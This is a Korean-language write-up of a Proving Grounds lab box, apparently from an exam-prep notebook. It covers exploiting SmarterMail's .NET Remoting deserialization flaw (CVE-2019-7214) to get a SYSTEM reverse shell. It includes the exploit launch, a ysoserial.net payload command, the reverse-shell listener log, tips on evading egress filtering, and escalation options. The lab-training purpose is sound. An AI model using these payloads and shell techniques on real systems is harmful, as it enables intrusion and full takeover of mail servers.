`80` 은 특권 포트라 리스너에 **`sudo` 가 필요함.** 빠뜨리면 `Permission denied` 로 뜨지 않는데, tmux 안에서 돌리면 그 에러를 못 보고 「리스닝 중」이라고 착각하게 됨.

기본값 4444 대신 80 을 고른 이유는 셋임.

- **아웃바운드 필터 회피** — 방화벽이 아웃바운드를 제한해도 80/443 은 열어두는 것이 관례. 4444 는 IDS 시그니처에도 걸림
- **성공 신호가 없기 때문** — 이 익스플로잇은 실패를 알려주지 않아 「페이로드가 안 터진 것」과 「터졌는데 아웃바운드가 막힌 것」을 구분할 수 없음. 아웃바운드 변수부터 제거하고 시작함
- **재시도 비용** — 실패하면 원인 후보가 여러 개라 첫 발사에서 변수 하나를 미리 없애는 쪽이 저렴함

**발사**

```bash
ssh kali@10.44.44.128 "cd ~/PG/Algernon && python3 exploit_algernon.py"
```

**출력이 전혀 없음** — 스크립트에 `print` 문이 0개이고 `s.send(msg)` 후 `s.close()` 로 끝나 응답을 읽지도, 성공 여부를 판정하지도 않음. 예외 없이 끝나면 종료 코드도 0 이지만 그것이 뜻하는 것은 **TCP 연결이 맺어지고 바이트를 write 했다**는 것뿐이고, 서버가 그것을 파싱했는지·가젯이 돌았는지·프로세스가 떴는지는 아무것도 검증하지 않음. 진실은 리스너에만 있으므로 발사 직후 리스너를 확인하고 15~20초 기다려도 아무것도 없으면 실패로 판정할 것.

진단이 필요하면 스크립트에 직접 넣는 편이 확실함. 아래는 이 박스에서 실행하지 않은 대안임(관측 없음).

```python
print(f'[+] payload len = {len(payload)}')
print(f'[+] uri = {uri}')
print(f'[+] sending {len(msg)} bytes to {HOST}:{PORT}')
s.send(msg)
print('[+] sent, closing')
s.close()
```

**셸 도착**

리스너 캡처 전량은 `shell_session.log` 1812바이트이고 아래가 그 앞부분임.

```text
listening on [any] 80 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.65] 49731
whoami
nt authority\system
PS C:\Windows\system32> hostname; type C:\Users\Administrator\Desktop\proof.txt
algernon
6126cdddc1ed43d92e8a34f71ecda278
```
— 출처: `~/PG/Algernon/shell_session.log`

**첫 명령에서 `nt authority\system`.** 출발지 포트 `49731` 은 Windows 동적 포트 범위(49152–65535)의 값으로, 타겟이 우리 쪽으로 나온 연결(리버스)임을 확인시켜 줌.

프롬프트 `PS C:\Windows\system32>` 는 원라이너 리버스셸이 매 명령 후 `"PS " + (pwd).Path + "> "` 를 직접 붙여 보내는 것이지 진짜 PowerShell 콘솔이 아님. 실무적 차이는 넷임.

- **탭 완성·화살표 히스토리·`Ctrl+C` 없음** — nc 의 raw 소켓일 뿐
- **대화형 프로그램 사용 불가** — `more`·자격증명 프롬프트에서 멈춤
- **`cd` 는 유지됨** — 한 프로세스 안에서 `iex` 를 반복하므로 상태가 살아 있음
- 리눅스의 `python3 -c 'import pty'` TTY 업그레이드는 해당 없음. Windows 에서 진짜 TTY 가 필요하면 RDP·WinRM·`ConPtyShell` 로 갈아타야 함

**수동 대안 — EDB 스크립트가 없거나 안 맞을 때**

동일 취약점의 Metasploit 모듈이 실재함(`exploits/windows/http/smartermail_rce`, Rank `ExcellentRanking` · `post/windows/gather/credentials/smartermail`). ⚠️ Metasploit 은 **금지가 아니라 시험 전체를 통틀어 1대 한정**이므로 여기서 카드를 태우지 않았음 — EDB 49216 은 순수 Python + 표준 라이브러리(`base64`·`socket`·`struct`)뿐이라 프레임워크 의존이 없고, 두 경로의 결과가 어차피 동일하게 SYSTEM 임.

스크립트조차 없다면 페이로드를 직접 만들어 쏘면 됨.

```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "powershell -enc <UTF16LE-base64>"
```

생성한 체인을 EDB 49216 의 프레임 조립부(`.NET` 매직 + 길이 + `tcp://<타겟>:17001/Servers` URI)에 그대로 넣고 `payload` 변수만 교체함. `ysoserial.net` 이 만든 체인은 길이 접두사를 생성기가 계산하므로 **1360바이트 제약에서 자유로움** — 긴 페이로드가 필요하면 스크립트를 고칠 것이 아니라 체인을 새로 생성하는 것이 정답.

**Local.txt value:**

**없음.** `local.txt` 는 이 박스에 배치되지 않았음.

```text
PS C:\Windows\system32> Get-ChildItem C:\Users -Directory | Select-Object -Expan
d Name
.NET v4.5
.NET v4.5 Classic
Administrator
dean
DefaultAppPool
Public
PS C:\Windows\system32> Get-ChildItem C:\Users\dean\Desktop, C:\Users\Administra
tor\Desktop -Force -ErrorAction SilentlyContinue | Select-Object FullName

FullName
--------
C:\Users\dean\Desktop\desktop.ini
C:\Users\dean\Desktop\Microsoft Edge.lnk
C:\Users\Administrator\Desktop\desktop.ini
C:\Users\Administrator\Desktop\Microsoft Edge.lnk
C:\Users\Administrator\Desktop\proof.txt
```
— 출처: `~/PG/Algernon/shell_session.log`

- 실제 사람 계정은 **`dean` 과 `Administrator` 둘뿐**(`.NET v4.5`·`DefaultAppPool` 은 앱풀 프로필, `Public` 은 공용)
- 두 Desktop 을 `-Force` 로 조회해 숨김·시스템 속성 파일까지 포함시킴. `Get-ChildItem`/`dir` 은 기본적으로 숨김 파일을 안 보여주고 PG 플래그가 숨김 속성인 경우가 있음(cmd 는 `dir /a`)
- `-ErrorAction SilentlyContinue` 는 접근 거부 항목에서 멈추지 않고 계속 훑기 위한 것. SYSTEM 이라도 일부 항목에서 에러가 나고 그때 멈추면 결과가 잘림
- `dean` 의 Desktop 에는 `desktop.ini` 와 바로가기뿐 — **표준 위치 어디에도 `local.txt` 가 없음**

⚠️ **전역 검색은 「배제」가 아니라 「미완」임.** 로그 앞부분에 전역 재귀 검색을 한 번 던진 기록이 남아 있는데 **출력이 0줄**임.

```text
PS C:\Windows\system32> cmd /c "dir C:\ /s /b 2>/dev/null | findstr /i \"proof.t
xt local.txt\""
```
— 출처: `~/PG/Algernon/shell_session.log`

`2>/dev/null` 은 Windows 리다이렉션이 아님(`2>NUL` 이 정답) — cmd 가 `\dev\null` 경로 생성에 실패해 명령 자체가 조용히 죽은 것으로 보임 `[가정]`. 즉 **0줄은 「없다」의 근거가 아니라 「판정 불가」임.** 재시도하지 않았음(관측 없음).

따라서 `local.txt` 부재의 근거는 위 **표준 위치 전수 확인까지**이고, 전역 재귀 검색으로 확증된 것은 아님.

### Privilege Escalation – 없음 (`MailService` 가 `LocalSystem` 으로 구동)

초기 접근이 곧 SYSTEM 이라 **권한상승 취약점 자체가 존재하지 않음.** 근본 원인은 `Initial Access` 의 `Vulnerability Fix:` 가 담음(서비스 계정 강등).

실측 근거 둘.

```text
whoami
nt authority\system
```

```text
PS C:\Windows\system32> Get-CimInstance Win32_Service | Where-Object {$_.Name -l
ike "*mail*"} | Select-Object Name,StartName,State,PathName | Format-List


Name      : MailService
StartName : LocalSystem
State     : Running
PathName  : "C:\Program Files (x86)\SmarterTools\SmarterMail\Service\MailService
.exe"
```
— 출처: `~/PG/Algernon/shell_session.log`

**`StartName : LocalSystem` 한 줄이 권한상승 장을 통째로 삭제함.** Windows 서비스는 실행 계정을 반드시 하나 가지고, 그 계정이 곧 익스플로잇 성공 시 얻는 권한임.

| `StartName` | 익스플로잇하면 무엇을 얻는가 | 다음 수 |
|---|---|---|
| `LocalSystem` | `NT AUTHORITY\SYSTEM` | 끝. 권한상승 불필요 |
| `NT AUTHORITY\LocalService` | `LOCAL SERVICE` — 특권이 박탈된 상태 | FullPowers 로 특권 복원 → PrintSpoofer/Potato([[Squid]]) |
| `NT AUTHORITY\NetworkService` | `NETWORK SERVICE` | 동일. `SeImpersonatePrivilege` 확인 |
| `IIS APPPOOL\<pool>` | 앱풀 아이덴티티 | 동일. `whoami /priv` |
| 도메인/로컬 사용자 계정 | 그 사용자 | 서비스 계정의 평문 비밀번호가 레지스트리에 있을 수 있음 |

이 박스에서 **검토하지 않은** 경로는 아래와 같음. 전부 SYSTEM 을 이미 얻어 불필요했던 것이지 배제한 것이 아님.

| 경로 | 상태 |
|---|---|
| `SeImpersonatePrivilege` → PrintSpoofer/Potato | 불필요. 이미 SYSTEM |
| unquoted service path | `PathName` 이 따옴표로 감싸져 있어 해당 없음 |
| 서비스 바이너리 쓰기 권한 | 확인하지 않음 — 관측 없음. SYSTEM 이므로 무의미하다는 판단은 `[가정]` |
| AlwaysInstallElevated · 저장된 자격증명 | 확인하지 않음(관측 없음) |
| 커널 익스플로잇(Build 18363) | 불필요. 최후 수단이고 박스를 죽일 위험이 큼 |

### Post-Exploitation

**Proof.txt value:**
`6126cdddc1ed43d92e8a34f71ecda278` (`C:\Users\Administrator\Desktop\proof.txt`)

```text
PS C:\Windows\system32> hostname; type C:\Users\Administrator\Desktop\proof.txt
algernon
6126cdddc1ed43d92e8a34f71ecda278
```
— 출처: `~/PG/Algernon/shell_session.log`

⚠️ **이 캡처는 시험 증거 형식으로는 부족함.** `whoami` 는 직전 명령으로 따로 쳤고 IP 는 찍지 않았음 — 시험에서는 `whoami`(권한) · `hostname`(어느 박스) · `ipconfig`(타겟 IP) · 플래그가 **한 화면**에 있어야 함.

이 박스의 셸은 PowerShell 원라이너이므로 구분자는 **세미콜론**임.

```powershell
whoami; hostname; ipconfig | findstr IPv4; type C:\Users\Administrator\Desktop\proof.txt
```

⚠️ **`&` 로 이으면 안 됨.** cmd 에서는 `&` 가 명령 구분자지만 **PowerShell 에서는 아님** — Windows PowerShell 5.1 은 `whoami & hostname` 을 파싱 단계에서 거절하고(`The ampersand (&) character is not allowed. The & operator is reserved for future use`), PowerShell 7 은 앞 명령을 **백그라운드 잡으로 돌려** 그 출력이 화면에 안 나옴. 어느 쪽이든 증거가 깨짐. cmd 셸일 때만 아래를 씀.

```bat
whoami & hostname & ipconfig | findstr IPv4 & type C:\Users\Administrator\Desktop\proof.txt
```

**남긴 흔적**

| 위치 | 내용 |
|---|---|
| 타겟 프로세스 | 익스플로잇이 띄운 `cmd.exe` → `powershell.exe`(리버스셸). 인스턴스 정지로 파괴됨 |
| 타겟 로그 | SmarterMail `Logs` 디렉터리에 역직렬화 예외·연결 기록이 남았을 가능성 `[가정]` — 확인하지 않았음 |
| 타겟 파일 | 업로드·계정 생성·설정 변경 없음 |
| Kali | `~/PG/Algernon/` — nmap 3종, gobuster 2종, `49216.py`(원본), `exploit_algernon.py`(수정본), `shell_session.log`, 스크린샷 |
| Kali tmux | `alg80` 세션(`tmux kill-session -t alg80` 로 정리) |
| 볼트 | `파일보관/PG-Algernon-smartermail-login.png` |

## 관련

- **CVE-2019-7214** — SmarterMail .NET Remoting `BinaryFormatter` 역직렬화 RCE. 빌드 6985 미만
- **EDB 49216** — `SmarterMail Build 6985 - Remote Code Execution`(author: 1F98D / original: Soroush Dalili). 로컬 사본 `~/PG/Algernon/49216.py`
- **NCC Group** — *Technical Advisory: Multiple Vulnerabilities in SmarterMail*(익스플로잇 헤더에 명시된 원 출처)
- **`ysoserial.net`** — .NET 가젯 체인 생성기. 이 박스가 쓰는 체인은 `TypeConfuseDelegate`
- **`ExploitRemotingService`**(James Forshaw) — .NET Remoting 전용 공격 도구. EDB 스크립트가 안 통할 때의 대안
- **MS-NRTP / MS-NRBF** — .NET Remoting TCP 프로토콜 및 바이너리 직렬화 포맷 공식 명세
- [[Squid]] — Windows 박스, 서비스 계정이 `LOCAL SERVICE` → FullPowers → PrintSpoofer. **이 박스가 `LocalSystem` 이 아니었다면 그 경로였음.** 인용 붕괴 함정도 공유
- [[Hawat]] · [[Exfiltrated]] — 출력 채널이 없는 익스플로잇 / 인코딩으로 인용 우회
- [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] — 「응답이 성공을 뜻하지 않는다」 누적 패턴
- [[Hub]] · [[Levram]] — 「버전 판정은 독립 근거 2개」 누적 패턴
- [[Muddy]] — `--min-rate` 고레이트 스캔의 유령 포트
- [[_PLAYBOOK#A-12. 응답이 성공을 뜻하지 않는다]] · [[_PLAYBOOK#A-13. 익스플로잇을 던지기 전에 버전과 CVE 표기를 검증한다]] · [[_PLAYBOOK#A-14. 공개 PoC는 실행 전에 소스를 읽는다]]
- [[_PLAYBOOK#A-1-18. `--min-rate` 를 높이면 «유령 포트»가 생긴다]] · [[_PLAYBOOK#A-1-25. Windows 타겟과 Kali 는 대소문자 규칙이 반대다 — 양방향으로 사고가 남]] · [[_PLAYBOOK#A-1-26. 브루트 결과의 `400`·예약 장치명·제어문자는 발견이 아니다]]
- [[_PLAYBOOK#A-2-32. 역직렬화 가젯 체인이 «에러 없이» 죽는다]] · [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]] · [[_PLAYBOOK#A-33. 셸을 내 손으로 죽였다 — 인터랙티브 프롬프트와 `pkill -f`]]
- [[_PLAYBOOK#B-81. 페이로드는 base64로 감싼다]] · [[_PLAYBOOK#B-84. 원격에서 만든 스크립트는 이스케이프가 «한 겹» 먹힌다]] · [[_PLAYBOOK#B-44. unquoted service path 를 봤을 때 잴 것은 «공백»이 아니라 `icacls` 의 `(AD)`·`(IO)`]]
- [[_PLAYBOOK#C-2. 셸 직후]] · [[_PLAYBOOK#C-3. 플래그·증거]]
- [[_PLAYBOOK#B-2-16. .NET Remoting 은 그 자체로 무인증 역직렬화 엔드포인트다]] · [[_PLAYBOOK#B-1-51. BinaryFormatter 계열 역직렬화가 왜 RCE 인가]] · [[_PLAYBOOK#B-2-17. ftp-anon 을 보면 «먼저» 통째로 받는다]] — 이 박스에서 새로 뽑은 기법 카드
